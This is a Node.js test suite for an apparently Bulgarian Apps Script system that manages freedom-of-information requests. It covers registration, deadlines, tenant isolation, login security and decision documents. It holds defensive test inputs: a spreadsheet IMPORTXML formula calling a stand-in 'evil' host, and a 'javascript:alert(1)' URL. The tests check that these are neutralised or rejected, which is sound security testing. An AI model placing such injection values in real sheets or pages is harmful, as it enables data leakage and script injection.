/* node --test tests/ */
const test = require('node:test'), assert = require('node:assert/strict');
const { load } = require('./mock-google');

const orgData = (over = {}) => Object.assign({
  name: 'Община Тест', type: 'Община', basis: 'чл. 3, ал. 1', eik: '000696327', oblast: 'София', municipality: 'Столична', city: 'София', postcode: '1000',
  address: 'ул. Първа 1', phone: '+35929000000', email: 'obshtina@example.org', web: 'https://example.org', headName: 'Иван Иванов', headPosition: 'Кмет',
  unitName: 'Деловодство', unitAddress: 'ул. Първа 1', unitEmail: 'zdoi@example.org', unitPhone: '029000001', unitHours: '9–17 ч.', court: 'Административен съд София-град',
  adminName: 'Мария Петрова', adminPosition: 'Юрисконсулт', adminEmail: 'admin@example.org', adminPhone: '0888000000', adminUsername: 'mpetrova', declare: true
}, over);
const HASH = c => c.repeat(44);
const tokenOf = link => link.split('/').pop();
const parts = link => /activate\/(\d+)\/([^/]+)\/(\w+)/.exec(link);
let counter = 1000000;
const newNo = g => { const b = String(counter++); return b + g.t.luhn_(b); };
const apply = (g, over) => g.call('public.apply', Object.assign(orgData(over), { no: newNo(g), hash: HASH('p') }, over));
const addStaff = (g, adminToken, username = 'emp1') => {
  const r = g.call('users.save', { isNew: true, username, name: 'Служител', position: 'Експерт', email: 'emp@example.org', role: 'Служител' }, adminToken);
  assert.equal(r.created, true, JSON.stringify(r));
  return parts(r.link);
};

function operator(g) {
  const link = g.setup();
  const r = g.call('activate', { no: '00000000', username: 'admin', token: tokenOf(link), hash: HASH('o') });
  assert.equal(r.ok, true, JSON.stringify(r));
  return g.call('login', { no: '00000000', username: 'admin', hash: HASH('o') }).token;
}
function approve(g, op, over) {
  const a = apply(g, over);
  assert.equal(a.ok, true, JSON.stringify(a));
  const d = g.call('op.decide', { id: a.id, approve: true }, op);
  assert.equal(d.ok, true, JSON.stringify(d));
  const username = (over && over.adminUsername) || 'mpetrova';
  const l = g.call('login', { no: d.no, username, hash: HASH('p') });
  assert.equal(l.ok, true, JSON.stringify(l));
  return { no: d.no, token: l.token, username };
}
const caseData = (over = {}) => Object.assign({
  kind: 'Достъп до обществена информация', regDate: '2026-11-02', channel: 'Писмено', applicantType: 'Гражданин', applicantName: 'Петър Петров',
  applicantAddress: 'ул. Втора 2', subject: 'Договори за 2025 г.', form: 'копия на материален носител'
}, over);
const updateData = (c, over = {}) => Object.assign({}, c, over);
const setupTwo = () => {
  const g = load(), op = operator(g);
  const a = approve(g, op);
  const b = approve(g, op, { name: 'Агенция Б', type: 'Друга администрация', eik: '121758615', adminUsername: 'bobo', adminEmail: 'b@example.org', email: 'b-org@example.org' });
  return { g, op, a, b };
};

test('EIK validation accepts real numbers and rejects bad checksums', () => {
  const { t } = load();
  assert.equal(t.validEik_('000696327'), true);
  assert.equal(t.validEik_('000696328'), false);
  assert.equal(t.validEik_('12345'), false);
});

test('holidays and terms: deadline ending on non-working day moves forward', () => {
  const { t } = load();
  assert.equal(t.term_('2026-12-10', 14), '2026-12-29'); // 24–26.12 празници, 27 неделя, 28 почивен вместо 26 (събота)
  assert.equal(t.term_('2026-04-30', 1), '2026-05-04'); // 01.05 празник (петък), 02–03 уикенд
  assert.equal(t.term_('2026-04-02', 8), '2026-04-14'); // Великден 12.04.2026: 10–13 са неработни
});

test('registration requires all organization data and declaration', () => {
  const g = load(); operator(g);
  for (const k of ['address', 'headName', 'unitEmail', 'court', 'adminEmail']) {
    const r = apply(g, { [k]: '' });
    assert.equal(r.ok, false, k);
  }
  assert.equal(apply(g, { declare: false }).ok, false);
  assert.equal(apply(g, { eik: '123456789' }).error, 'eik');
  assert.equal(apply(g, { hash: '' }).error, 'value');
  assert.equal(apply(g, { no: '00000000' }).error, 'value');
  assert.equal(apply(g, { no: '12345678' }).error, 'value', 'wrong check digit');
});

test('organizations never receive access data by email', () => {
  const { g, op, a } = setupTwo();
  const b = addStaff(g, a.token);
  g.call('users.invite', { username: 'emp1' }, a.token);
  g.call('op.user.password', { no: a.no, username: a.username, hash: HASH('g') }, op);
  g.call('op.org.create', Object.assign(orgData({ eik: '831902088', name: 'От оператор', adminUsername: 'opadmin' }), { no: newNo(g), hash: HASH('g') }), op);
  const rejected = apply(g, { eik: '121758615', name: 'Трета' });
  g.call('op.decide', { id: rejected.id, approve: false, reason: 'x' }, op);
  const orgMails = g.mails.filter(m => m.to !== 'owner@example.org');
  assert.ok(orgMails.length > 0);
  orgMails.forEach(m => {
    const text = m.subject + ' ' + m.body;
    assert.ok(!/activate/.test(text), 'без връзка: ' + text);
    assert.ok(!text.includes(a.no), 'без номер на организация: ' + text);
    assert.ok(!text.includes(a.username) && !text.includes('opadmin') && !text.includes(b[3]), 'без потребител: ' + text);
    assert.ok(!/парола:/i.test(text), text);
  });
  assert.equal(g.call('forgot', { no: a.no, username: a.username }).error, 'action');
});

test('administrator password chosen at registration works only after approval', () => {
  const g = load(), op = operator(g);
  const no = newNo(g);
  const a = g.call('public.apply', Object.assign(orgData(), { no, hash: HASH('z') }));
  assert.equal(a.ok, true, JSON.stringify(a));
  assert.equal(g.call('login', { no, username: 'mpetrova', hash: HASH('z') }).error, 'login');
  const pending = JSON.stringify(g.call('op.apps', {}, op));
  assert.ok(!/"hash"|"salt"/.test(pending), 'hash not shown to the operator');
  assert.equal(g.call('op.decide', { id: a.id, approve: true }, op).no, no);
  assert.equal(g.call('login', { no, username: 'mpetrova', hash: HASH('z') }).ok, true);
  assert.equal(g.call('login', { no, username: 'mpetrova', hash: HASH('y') }).error, 'login');
  const master = [...g.books.values()].find(x => /главна/.test(x.name)).getSheetByName('Заявки за регистрация');
  const hashCol = master.cells[0].indexOf('Хеш');
  assert.equal(master.cells[1][hashCol], '', 'hash removed from master after approval');
});

test('a taken organization number asks the browser to retry', () => {
  const g = load(); operator(g);
  const no = newNo(g);
  assert.equal(g.call('public.apply', Object.assign(orgData(), { no, hash: HASH('z') })).ok, true);
  const r = g.call('public.apply', Object.assign(orgData({ eik: '121758615' }), { no, hash: HASH('z') }));
  assert.equal(r.error, 'retry');
});

test('new columns are added to a master table created by an older version', () => {
  const g = load(); operator(g);
  const master = [...g.books.values()].find(x => /главна/.test(x.name));
  const sheet = master.insertSheet('стар');
  master.deleteSheet(master.getSheetByName('Заявки за регистрация'));
  sheet.name = 'Заявки за регистрация';
  const old = ['№', 'Подадена', 'Статус', 'Организация', 'ЕИК/БУЛСТАТ', 'Вид', 'Официален имейл', 'Данни (JSON)', 'Причина за отказ', 'Решил', 'Дата на решение', 'Номер на организация'];
  sheet.getRange(1, 1, 1, old.length).setValues([old]);
  g.ctx.resetHeaders(); // ново изпълнение на скрипта
  const a = apply(g);
  assert.equal(a.ok, true, JSON.stringify(a));
  assert.equal(sheet.cells[0].at(-1), 'Хеш');
});

test('organization cannot log in before approval; duplicates are rejected', () => {
  const g = load(), op = operator(g);
  const a = apply(g);
  assert.equal(a.ok, true);
  assert.equal(apply(g).error, 'duplicate');
  assert.equal(g.call('op.apps', {}, op).apps[0].status, 'Чака одобрение');
  assert.equal(g.books.size, 1, 'no organization spreadsheet before approval');
});

test('rejection records reason and creates no spreadsheet', () => {
  const g = load(), op = operator(g);
  const a = apply(g);
  assert.equal(g.call('op.decide', { id: a.id, approve: false }, op).error, 'required');
  assert.equal(g.call('op.decide', { id: a.id, approve: false, reason: 'Неверни данни' }, op).ok, true);
  assert.equal(g.call('op.apps', {}, op).apps[0].status, 'Отказана');
  assert.equal(g.books.size, 1);
  assert.equal(g.call('op.decide', { id: a.id, approve: true }, op).error, 'state');
});

test('each organization gets its own spreadsheet in the data folder', () => {
  const { g, a, b } = setupTwo();
  assert.equal(g.books.size, 3); // главна + 2
  assert.notEqual(a.no, b.no);
  const orgBooks = [...g.books.values()].filter(x => /^ЗДОИ4You – \d{8}/.test(x.name));
  assert.equal(orgBooks.length, 2);
  orgBooks.forEach(x => {
    assert.equal(x.folder, 'folder1');
    ['Профил', 'Потребители', 'Преписки', 'Събития', 'Документи', 'Чл. 15', 'Броячи', 'Дневник'].forEach(n => assert.ok(x.getSheetByName(n), n));
    assert.equal(x.getSheetByName('Лист1'), null);
  });
  const masterSheets = [...g.books.values()].find(x => /главна/.test(x.name)).sheets.map(s => s.name);
  assert.ok(!masterSheets.includes('Преписки'), 'cases are never in the master spreadsheet');
});

test('tenant isolation: same register number, separate data, no cross access', () => {
  const { g, a, b } = setupTwo();
  const ca = g.call('case.create', caseData({ subject: 'ТАЙНА НА А' }), a.token);
  const cb = g.call('case.create', caseData({ subject: 'ДАННИ НА Б' }), b.token);
  assert.equal(ca.regNo, cb.regNo, 'numbering is per organization');
  assert.equal(g.call('case.get', { regNo: ca.regNo }, a.token).case.subject, 'ТАЙНА НА А');
  assert.equal(g.call('case.get', { regNo: cb.regNo }, b.token).case.subject, 'ДАННИ НА Б');
  assert.ok(!JSON.stringify(g.call('case.list', {}, b.token)).includes('ТАЙНА НА А'));
  // опит да се подаде чужд номер или таблица в данните не променя организацията
  const forged = g.call('case.list', { no: a.no, sheetId: 'book2', org: a.no }, b.token);
  assert.ok(!JSON.stringify(forged).includes('ТАЙНА НА А'));
  const orgBooks = [...g.books.values()].filter(x => /^ЗДОИ4You – \d{8}/.test(x.name));
  const hasA = orgBooks.filter(x => JSON.stringify(x.getSheetByName('Преписки').cells).includes('ТАЙНА НА А'));
  assert.equal(hasA.length, 1, 'stored in exactly one spreadsheet');
});

test('login needs the right organization number, user and password', () => {
  const { g, a, b } = setupTwo();
  assert.equal(g.call('login', { no: b.no, username: a.username, hash: HASH('p') }).error, 'login');
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('x') }).error, 'login');
  const u = g.call('login', { no: a.no, username: 'nobody', hash: HASH('x') });
  const w = g.call('login', { no: a.no, username: a.username, hash: HASH('x') });
  assert.equal(u.message, w.message, 'no user enumeration');
});

test('lockout after repeated failures, then recovery', () => {
  const { g, a } = setupTwo();
  for (let i = 0; i < 5; i++) g.call('login', { no: a.no, username: a.username, hash: HASH('x') });
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).error, 'locked');
  g.advance(16 * 60e3);
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).ok, true);
});

test('invitation is single use and expires', () => {
  const { g, a } = setupTwo();
  const m = addStaff(g, a.token);
  assert.equal(g.call('login', { no: m[1], username: m[2], hash: HASH('e') }).error, 'login', 'no password before activation');
  assert.equal(g.call('activate', { no: m[1], username: m[2], token: m[3], hash: HASH('e') }).ok, true);
  assert.equal(g.call('activate', { no: m[1], username: m[2], token: m[3], hash: HASH('q') }).error, 'invite');
  assert.equal(g.call('login', { no: m[1], username: m[2], hash: HASH('e') }).ok, true);
  const e = addStaff(g, g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).token, 'emp2');
  g.advance(8 * 864e5);
  assert.equal(g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') }).error, 'invite');
});

test('roles: staff cannot administer, organization cannot reach operator actions', () => {
  const { g, a } = setupTwo();
  const e = addStaff(g, a.token);
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  const staff = g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).token;
  assert.equal(g.call('case.create', caseData(), staff).ok, true);
  for (const act of ['users.list', 'users.save', 'org.save', 'log.list']) assert.equal(g.call(act, {}, staff).error, 'role', act);
  for (const act of ['op.apps', 'op.orgs', 'op.decide', 'op.log']) assert.equal(g.call(act, {}, a.token).error, 'role', act);
  assert.equal(g.call('case.list', {}, 'x'.repeat(64)).error, 'session');
  assert.equal(g.call('case.list', {}).error, 'session');
});

test('deactivated user and suspended organization lose access immediately', () => {
  const { g, op, a, b } = setupTwo();
  assert.equal(g.call('case.list', {}, b.token).ok, true);
  assert.equal(g.call('op.status', { no: b.no, status: 'Спряна' }, op).ok, true);
  assert.equal(g.call('case.list', {}, b.token).error, 'session');
  assert.equal(g.call('login', { no: b.no, username: b.username, hash: HASH('p') }).error, 'login');
  const e = addStaff(g, a.token);
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  const staff = g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).token;
  assert.equal(g.call('case.list', {}, staff).ok, true);
  g.call('users.save', { username: 'emp1', name: 'С', position: 'Е', email: 'e@example.org', role: 'Служител', active: false }, a.token);
  assert.equal(g.call('case.list', {}, staff).error, 'session');
});

test('the last active administrator cannot be removed', () => {
  const { g, a } = setupTwo();
  const r = g.call('users.save', { username: a.username, name: 'М', position: 'Ю', email: 'admin@example.org', role: 'Служител' }, a.token);
  assert.equal(r.error, 'lastadmin');
});

test('session expires after 30 minutes and can be extended; logout ends it', () => {
  const { g, a } = setupTwo();
  g.advance(29 * 60e3);
  assert.equal(g.call('extend', {}, a.token).ok, true);
  g.advance(29 * 60e3);
  assert.equal(g.call('case.list', {}, a.token).ok, true);
  g.advance(2 * 60e3);
  assert.equal(g.call('case.list', {}, a.token).error, 'session');
  const t = g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).token;
  g.call('logout', {}, t);
  assert.equal(g.call('case.list', {}, t).error, 'session');
});

test('no API response ever contains password material', () => {
  const { g, op, a } = setupTwo();
  const all = [g.call('users.list', {}, a.token), g.call('org.bootstrap', {}, a.token), g.call('op.orgs', {}, op), g.call('op.apps', {}, op)];
  all.forEach(r => {
    assert.equal(r.ok, true);
    const s = JSON.stringify(r);
    assert.ok(!/"(salt|hash|inviteHash)"/.test(s), s.slice(0, 200));
    assert.ok(!/sheetId/.test(JSON.stringify(g.call('op.orgs', {}, op))));
  });
});

test('formula-looking input is stored inert and read back unchanged', () => {
  const { g, a } = setupTwo();
  const r = g.call('case.create', caseData({ applicantName: '=IMPORTXML("http://evil","//a")', applicantPhone: '+359888' }), a.token);
  const c = g.call('case.get', { regNo: r.regNo }, a.token).case;
  assert.equal(c.applicantName, '=IMPORTXML("http://evil","//a")');
  assert.equal(c.applicantPhone, '+359888');
  const book = [...g.books.values()].find(x => JSON.stringify(x.getSheetByName('Преписки')?.cells || []).includes('IMPORTXML'));
  assert.ok(book.getSheetByName('Преписки').cells[1].some(v => String(v).startsWith("'=IMPORTXML")));
});

test('deadlines follow arts. 28–31 and the clarify cycle', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData({ regDate: '2026-11-02' }), a.token).regNo;
  let c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.due, '2026-11-16');
  g.call('doc.create', { type: 'extend30', regNo: reg, title: 'x', date: '2026-11-03', fields: { days: '10', reason: 'голямо количество' } }, a.token);
  c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.due, '2026-11-26');
  assert.equal(g.call('doc.create', { type: 'extend30', regNo: reg, fields: { days: '11', reason: 'x' } }, a.token).error, 'value');
  g.call('doc.create', { type: 'clarify', regNo: reg, title: 'x', date: '2026-11-04', fields: { what: 'кои договори' } }, a.token);
  c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.status, 'Чака уточняване');
  assert.equal(c.due, '2026-12-04');
  const u = g.call('case.update', updateData(c, { clarifyGot: '2026-11-10' }), a.token);
  assert.equal(u.ok, true, JSON.stringify(u));
  c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.status, 'В обработка');
  assert.equal(c.due, '2026-12-04'); // 10.11 + 14 + 10
});

test('decision documents validate the law and update the case', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const short = { scope: 'пълен', accessDays: '10', place: 'х', accessForm: 'х', costs: '0' };
  assert.equal(g.call('doc.create', { type: 'grant', regNo: reg, fields: short }, a.token).error, 'accessDays');
  const ok = g.call('doc.create', { type: 'grant', regNo: reg, title: 'Решение', date: '2026-11-05', fields: { ...short, accessDays: '30' } }, a.token);
  assert.equal(ok.ok, true, JSON.stringify(ok));
  assert.equal(ok.no, 'РЕШ-2026-0001');
  const c = g.call('case.get', { regNo: reg }, a.token);
  assert.equal(c.case.outcome, 'Предоставен достъп');
  assert.equal(c.case.decisionNo, 'РЕШ-2026-0001');
  assert.equal(c.case.due, '', 'no pending deadline after a decision');
  assert.equal(c.docs.length, 1);
  const again = g.call('doc.get', { id: ok.id }, a.token);
  assert.deepEqual(again.payload, ok.payload);
  assert.equal(g.call('doc.create', { type: 'refuse', regNo: reg, fields: { groundKey: 'zz', factual: 'x' } }, a.token).error, 'value');
  assert.equal(g.call('doc.create', { type: 'refuse', regNo: reg, fields: { groundKey: 't2' } }, a.token).error, 'required');
});

test('a document from one organization is unreachable from another', () => {
  const { g, a, b } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const doc = g.call('doc.create', { type: 'noinfo', regNo: reg, title: 'x', fields: {} }, a.token);
  assert.equal(doc.ok, true, JSON.stringify(doc));
  assert.equal(g.call('doc.get', { id: doc.id }, b.token).error, 'notfound');
});

test('annual report counts by year, outcome and refusal ground', () => {
  const { g, a } = setupTwo();
  const r1 = g.call('case.create', caseData({ regDate: '2025-03-03' }), a.token).regNo;
  g.call('case.create', caseData({ regDate: '2025-04-01', kind: 'Повторно използване на информация', applicantType: 'Журналист или медия' }), a.token);
  g.call('case.create', caseData({ regDate: '2026-01-05' }), a.token);
  g.call('doc.create', { type: 'refuse', regNo: r1, title: 'x', date: '2025-03-10', fields: { groundKey: 't3', factual: 'предоставена е' } }, a.token);
  const s = g.call('report.stats', { year: '2025' }, a.token).stats;
  assert.equal(s.total, 2);
  assert.equal(s.access, 1);
  assert.equal(s.reuse, 1);
  assert.equal(s.refusals, 1);
  assert.equal(s.byOutcome['Отказ'], 1);
  assert.equal(s.byApplicant['Журналист или медия'], 1);
  assert.ok(Object.entries(s.grounds).some(([k, v]) => k.includes('т. 3') && v === 1));
  const d = g.call('doc.create', { type: 'report', title: 'x', fields: { year: '2025' } }, a.token);
  assert.equal(d.payload.stats.total, 2);
});

test('article 15 items are saved per item and validated', () => {
  const { g, a } = setupTwo();
  assert.equal(g.call('art15.save', { item: '18', text: 'x' }, a.token).error, 'value');
  assert.equal(g.call('art15.save', { item: '4', text: 'x', url: 'javascript:alert(1)' }, a.token).error, 'value');
  assert.equal(g.call('art15.save', { item: '4', text: 'Деловодство', url: 'https://example.org/z' }, a.token).ok, true);
  assert.equal(g.call('art15.save', { item: '4', text: 'Ново', url: '' }, a.token).ok, true);
  const items = g.call('art15.get', {}, a.token).items;
  assert.equal(items.length, 1);
  assert.equal(items[0].text, 'Ново');
});

test('a forgotten password is reset with a one-time link from an administrator or the operator', () => {
  const { g, op, a } = setupTwo();
  const e = addStaff(g, a.token);
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  const staffLink = parts(g.call('users.invite', { username: 'emp1' }, a.token).link);
  assert.equal(g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).ok, true, 'old password works until reset');
  assert.equal(g.call('activate', { no: staffLink[1], username: staffLink[2], token: staffLink[3], hash: HASH('n') }).ok, true);
  assert.equal(g.call('login', { no: a.no, username: 'emp1', hash: HASH('n') }).ok, true);
  const adminLink = parts(g.call('users.invite', { username: a.username }, a.token).link);
  assert.equal(g.call('activate', { no: adminLink[1], username: adminLink[2], token: adminLink[3], hash: HASH('m') }).ok, true);
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('m') }).ok, true);
  assert.equal(g.call('op.inviteAdmin', { no: a.no }, op).error, 'action');
});

test('operator adds an organization directly, in its own spreadsheet, with a forced password change', () => {
  const g = load(), op = operator(g);
  const no = newNo(g);
  const data = orgData({ adminUsername: 'opadmin' });
  assert.equal(g.call('op.org.create', Object.assign({}, data, { no, hash: '' }), op).error, 'value');
  assert.equal(g.call('op.org.create', Object.assign({}, data, { eik: '123456789', no, hash: HASH('g') }), op).error, 'eik');
  const r = g.call('op.org.create', Object.assign({}, data, { no, hash: HASH('g') }), op);
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.no, no);
  assert.ok([...g.books.values()].some(x => x.name.includes(no)), 'own spreadsheet');
  assert.equal(g.call('op.org.create', Object.assign({}, data, { no: newNo(g), hash: HASH('g') }), op).error, 'duplicate');
  assert.equal(g.call('public.apply', Object.assign(orgData(), { no: newNo(g), hash: HASH('g') })).error, 'duplicate');

  const l = g.call('login', { no, username: 'opadmin', hash: HASH('g') });
  assert.equal(l.me.mustChange, true);
  for (const act of ['case.list', 'org.bootstrap', 'users.list']) assert.equal(g.call(act, {}, l.token).error, 'mustchange', act);
  assert.equal(g.call('extend', {}, l.token).ok, true);
  assert.equal(g.call('password', { current: HASH('g'), next: HASH('g') }, l.token).error, 'password', 'must really change');
  assert.equal(g.call('password', { current: HASH('g'), next: HASH('n') }, l.token).ok, true);
  assert.equal(g.call('case.list', {}, l.token).ok, true, 'free after the change');
  const again = g.call('login', { no, username: 'opadmin', hash: HASH('n') });
  assert.equal(again.me.mustChange, false);
});

test('operator generates a password; only its hash reaches the server and old password stops working', () => {
  const { g, op, a } = setupTwo();
  for (let i = 0; i < 5; i++) g.call('login', { no: a.no, username: a.username, hash: HASH('x') });
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).error, 'locked');
  assert.equal(g.call('op.user.password', { no: a.no, username: 'nobody', hash: HASH('g') }, op).error, 'notfound');
  assert.equal(g.call('op.user.password', { no: a.no, username: a.username, hash: HASH('g') }, op).ok, true);
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).error, 'login');
  const l = g.call('login', { no: a.no, username: a.username, hash: HASH('g') });
  assert.equal(l.me.mustChange, true, 'lockout cleared and change forced');
  assert.equal(g.call('op.org.get', { no: a.no }, op).users[0].mustChange, 'Да');
});

test('operator edits organization data, including EIK, and it reaches the register', () => {
  const { g, op, a, b } = setupTwo();
  const got = g.call('op.org.get', { no: a.no }, op);
  assert.ok(!/"(salt|hash|inviteHash|sheetId)"/.test(JSON.stringify(got)));
  const next = Object.assign({}, got.profile, { no: a.no, name: 'Ново име', eik: '831902088' });
  assert.equal(g.call('op.org.save', Object.assign({}, next, { address: '' }), op).error, 'required');
  assert.equal(g.call('op.org.save', Object.assign({}, next, { eik: '121758615' }), op).error, 'duplicate');
  assert.equal(g.call('op.org.save', next, op).ok, true);
  const reg = g.call('op.orgs', {}, op).orgs.find(o => o.no === a.no);
  assert.equal(reg.name, 'Ново име');
  assert.equal(reg.eik, '831902088');
  assert.equal(g.call('org.bootstrap', {}, a.token).profile.name, 'Ново име');
  assert.equal(g.call('org.bootstrap', {}, b.token).profile.name, 'Агенция Б', 'other organization untouched');
  assert.equal(g.call('op.org.get', { no: '99999999' }, op).error, 'notfound');
});

test('operator manages users of an organization; the last administrator stays protected', () => {
  const { g, op, a } = setupTwo();
  const r = g.call('op.user.save', { no: a.no, isNew: true, username: 'emp9', name: 'Служител', position: 'Експерт', email: 'e9@example.org', role: 'Служител' }, op);
  assert.equal(r.created, true, JSON.stringify(r));
  assert.ok(g.call('users.list', {}, a.token).users.some(u => u.username === 'emp9'));
  assert.equal(g.call('op.user.save', { no: a.no, username: a.username, name: 'М', position: 'Ю', email: 'admin@example.org', role: 'Служител' }, op).error, 'lastadmin');
});

test('organizations cannot use the new operator actions', () => {
  const { g, a, b } = setupTwo();
  for (const act of ['op.org.get', 'op.org.create', 'op.org.save', 'op.user.save', 'op.user.password']) {
    assert.equal(g.call(act, { no: b.no, username: b.username, hash: HASH('h') }, a.token).error, 'role', act);
  }
  assert.equal(g.call('login', { no: b.no, username: b.username, hash: HASH('p') }).ok, true, 'password of B untouched');
});

test('operator password can be reset only from the script editor', () => {
  const g = load(); operator(g);
  const before = g.mails.length;
  g.ctx.operatorReset();
  assert.equal(g.mails.length, before, 'no email');
});

test('password change requires the current password', () => {
  const { g, a } = setupTwo();
  assert.equal(g.call('password', { current: HASH('z'), next: HASH('n') }, a.token).error, 'password');
  assert.equal(g.call('password', { current: HASH('p'), next: HASH('n') }, a.token).ok, true);
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('n') }).ok, true);
});

test('tables grow past the default sheet size of Google (26 columns, 1000 rows)', () => {
  const { g, a } = setupTwo();
  const book = [...g.books.values()].find(x => /^ЗДОИ4You – \d{8}/.test(x.name) && x.name.includes(a.no));
  const sheet = book.getSheetByName('Преписки');
  assert.ok(sheet.getMaxColumns() > 26, 'cases need more than 26 columns');
  sheet.maxRows = sheet.getLastRow() + 1; // следващият запис е точно в края
  assert.equal(g.call('case.create', caseData(), a.token).ok, true);
  const second = g.call('case.create', caseData(), a.token);
  assert.equal(second.ok, true, JSON.stringify(second));
  assert.equal(g.call('case.get', { regNo: second.regNo }, a.token).case.applicantName, 'Петър Петров');
});

const sig = (over = {}) => Object.assign({ name: 'Петя Иванова', position: 'Секретар', act: 'Заповед № 12 от 01.02.2026 г.' }, over);

test('authorized persons: only an administrator or operator adds them, and each organization has its own', () => {
  const { g, op, a, b } = setupTwo();
  assert.equal(g.call('signers.save', sig({ act: '' }), a.token).error, 'required');
  assert.equal(g.call('signers.save', sig({ from: '2026-05-01', to: '2026-01-01' }), a.token).error, 'value');
  const s = g.call('signers.save', sig(), a.token);
  assert.equal(s.ok, true, JSON.stringify(s));
  assert.equal(g.call('org.bootstrap', {}, a.token).signers.length, 1);
  assert.equal(g.call('org.bootstrap', {}, b.token).signers.length, 0);
  assert.equal(g.call('op.signer.save', Object.assign(sig({ name: 'От оператор' }), { no: a.no }), op).ok, true);
  assert.equal(g.call('op.org.get', { no: a.no }, op).signers.length, 2);
  assert.equal(g.call('op.signer.save', Object.assign(sig(), { no: a.no }), a.token).error, 'role');
  const e = addStaff(g, a.token);
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  const staff = g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).token;
  assert.equal(g.call('signers.save', sig(), staff).error, 'role');
  assert.equal(g.call('org.bootstrap', {}, staff).signers.length, 2, 'staff can see and choose them');
});

test('decisions take the signer from the list; forged names and invalid persons are refused', () => {
  const { g, a, b } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const refuse = (fields, date = '2026-06-01', token = a.token) => g.call('doc.create', { type: 'refuse', regNo: reg, title: 'x', date, fields: Object.assign({ groundKey: 't3', factual: 'факти' }, fields) }, token);
  const id = g.call('signers.save', sig({ from: '2026-02-01', to: '2026-12-31' }), a.token).id;
  const ok = refuse({ signerId: id });
  assert.equal(ok.payload.f.signer, 'Петя Иванова');
  assert.equal(ok.payload.f.signerAct, 'Заповед № 12 от 01.02.2026 г.');
  assert.equal(refuse({ signerId: id }, '2027-01-15').error, 'signer', 'outside the validity period');
  assert.equal(refuse({ signerId: 'nosuch' }).error, 'signer');
  const forged = refuse({ signer: 'Подправено Име', signerPosition: 'Кмет', signerAct: 'Няма' });
  assert.equal(forged.payload.f.signer, undefined, 'typed names are ignored');
  const other = g.call('signers.save', sig(), b.token).id;
  assert.equal(refuse({ signerId: other }).error, 'signer', 'person from another organization');
  g.call('signers.save', sig({ id, active: false }), a.token);
  assert.equal(refuse({ signerId: id }).error, 'signer', 'deactivated');
});

test('motives, review edits and added text are stored and come back the same', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const fields = { groundKey: 't3', factual: 'факти', motives: 'Мотив едно.\n\nМотив две.', edits: JSON.stringify({ 2: 'променен абзац' }), extra: 'Добавка.' };
  const r = g.call('doc.create', { type: 'refuse', regNo: reg, title: 'x', date: '2026-06-01', fields }, a.token);
  assert.equal(r.ok, true, JSON.stringify(r));
  const back = g.call('doc.get', { id: r.id }, a.token).payload.f;
  assert.equal(back.motives, fields.motives);
  assert.equal(back.edits, fields.edits);
  assert.equal(back.extra, fields.extra);
  const big = 'м'.repeat(8000);
  const huge = g.call('doc.create', { type: 'refuse', regNo: reg, title: 'x', fields: { groundKey: 't3', factual: big, motives: big, extra: big, text: big, a1: big, a2: big, a3: big } }, a.token);
  assert.equal(huge.error, 'size', 'too large for one cell is refused, not cut');
});

test('authorized persons table appears in organizations created before this version', () => {
  const { g, a } = setupTwo();
  const book = [...g.books.values()].find(x => x.name.includes(a.no));
  book.deleteSheet(book.getSheetByName('Упълномощени лица'));
  assert.equal(g.call('org.bootstrap', {}, a.token).signers.length, 0);
  assert.equal(g.call('signers.save', sig(), a.token).ok, true);
  assert.ok(book.getSheetByName('Упълномощени лица'));
});

test('honeypot silently drops bots', () => {
  const g = load(); operator(g);
  const r = apply(g, { hp: 'bot' });
  assert.equal(r.ok, true);
  assert.equal(r.id, 'ok');
});
